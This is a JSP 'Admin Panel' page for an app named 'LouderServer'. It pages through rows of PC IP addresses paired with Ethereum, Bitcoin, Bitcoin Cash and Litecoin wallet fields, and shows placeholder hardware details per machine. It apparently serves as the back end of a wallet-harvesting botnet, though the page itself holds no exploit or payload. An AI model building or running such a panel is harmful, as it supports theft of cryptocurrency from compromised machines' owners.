<%@ page import = "java.util.ArrayList,java.util.Map,database.ItemsCRUD,com.Model.PcStatistics,com.DisplayContent.Pagination" %>

<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" >
    <link rel="stylesheet" href="styles/style.css">
    <title>Admin Panel</title>
</head>
<body>

    <%
    Pagination.pagination_init();
    %>

   <%!
    ItemsCRUD db_operation= new ItemsCRUD();
    ArrayList<PcStatistics> items;
    int count_pag=0,element_select=0;
    %>


<div class="nav_bar" >
    <a class="active" href="#home">Admin Panel</a>
       <a href="http://localhost:8080/LouderServer/hardwareinfo.jsp">hardware</a>
       <div class="logout_component">
       <a class="logoutstyle" href="#logout" >Logout</a>
    </div>
</div>


<div class="container">

<%
if(db_operation.get_data_is_empty()==0){
%>

<div class="row">
  <div class="emptycol" style="height:180px; width: 1024px;"></div>
</div>

<div class="row">
  <div class="col"></div>
    <div class="col" style="height: 60px; width: 400px;">
      <center>
        <div class="alert alert-danger" role="alert" style="height: 120px;width: 350px;size: 36px;font-size: 28px;">
          For this page data is not exists!!!
        </div>
      </center>
    </div>
  <div class="col"></div>
</div>


<%
}
else{
%>



<div class="row">
  <div class="emptycol" style="height:65px; width: 1024px;"></div>
</div>

<div class="row">
    <div class="emptycol" style="height:50px; width: 1024px;">
      <h2>Statistics</h2>
    </div>
</div>


<div class="row">

        <div class="tableinfo" style="width: 1024px;">

          <table class="table">
              <thead class="thead-dark">
                <tr>
                  <th scope="col">#</th>
                  <th scope="col">IP</th>
                  <th scope="col">Etherium</th>
                  <th scope="col">Bitcoi</th>
                  <th scope="col">Bitcoin Cash</th>
                  <th scope="col">Litecoin</th>
                </tr>
              </thead>



              <%

              if(Pagination.get_curent_page()!=1){
              items=db_operation.get_interval_items((Pagination.get_curent_page()*20)-20);
               count_pag=(Pagination.get_curent_page()*20)-20;
              }else{
               items=db_operation.get_interval_items(Pagination.get_curent_page());
                count_pag=Pagination.get_curent_page();
              }


              for(int i=0;i<items.size();++i){
              %>
              <tbody>
                <tr>
                  <th scope="row"><%= count_pag %></th>
                  <td>
                   <a data-target="#ModalHardware" data-toggle="modal"  href="#ModalHardware" onClick="<% element_select=12; %>"><%= items.get(i).getPC_ip()%></a>
                  </td>
                  <td><%= items.get(i).getEtherium_wallet() %></td>
                  <td><%= items.get(i).getBitcoi_wallet() %></td>
                  <td><%= items.get(i).getBitcoinCash_wallet() %></td>
                  <td><%= items.get(i).getLitecoin_wallet() %></td>
                </tr>
              </tbody>
              <%
              ++count_pag;
              }
              %>

        </table>

        </div>
</div>



<div class="row">
<div class="col"></div>
<div class="col">
        <div class="paginationinfo" style="height: 60px; width: 400px;">
                 <nav aria-label="Page navigation example">
                   <ul class="pagination">
                     <li class="page-item"><a class="page-link" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=prev&curent_page=empty">Previous</a></li>
                     <% for(int i=Pagination.get_previous_page();i<=Pagination.get_next_page();++i){
                         if(i==Pagination.get_curent_page()){
                     %>
                    <li class="page-item"><a class="page-link" style="background-color:#4caf5078;" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=empty&curent_page=<%=i%>"><%=i%></a></li>
                    <% }else{
                    %>
                     <li class="page-item"><a class="page-link" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=empty&curent_page=<%=i%>"><%=i%></a></li>
                     <%}
                     }
                     %>
                     <li class="page-item"><a class="page-link" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=next&curent_page=empty">Next</a></li>
                   </ul>
                 </nav>
               </div>
  </div>
  <div class="col"></div>
</div>

<%
}
%>

</div>


<div class="modal fade" id="ModalHardware" tabindex="-1" role="dialog" aria-labelledby="ModalHardwareLabel" aria-hidden="true" style="padding-top: 170px;" >
  <div class="modal-dialog" role="document" >
    <div class="modal-content" style="width: auto;height:auto;">
      <div class="modal-header" style="background-color:#212529;color: #fff;">
        <h3 class="modal-title" id="ModalHardwareLabel">Hardware info</h3>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="color: #fff;">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <center>
        <div class="container">

        <div class="row">
          <div class="col">
            <div class="inlines"><h3>IP:</h3></div>
            <%
            if(element_select!=0){
            %>
            <div class="inlines"><p><%=element_select%></p></div>
            <%
            }
            %>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>MAC:</h3></div>
              <div class="inlines"><p>12-56-65-00-12</p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>CPU:</h3></div>
              <div class="inlines"><p>Ryzen 1500x</p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>GPU:</h3></div>
              <div class="inlines"><p>Nvidia NX 78</p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>RAM:</h3></div>
              <div class="inlines"><p>454848888</p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>OStype:</h3></div>
              <div class="inlines"><p>Windows 7</p></div>
          </div>
        </div>

      </div>
  </center>
      </div>
    </div>
  </div>
</div>


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="bootstrap/js/bootstrap.min.js" ></script>
  </body>
</html>
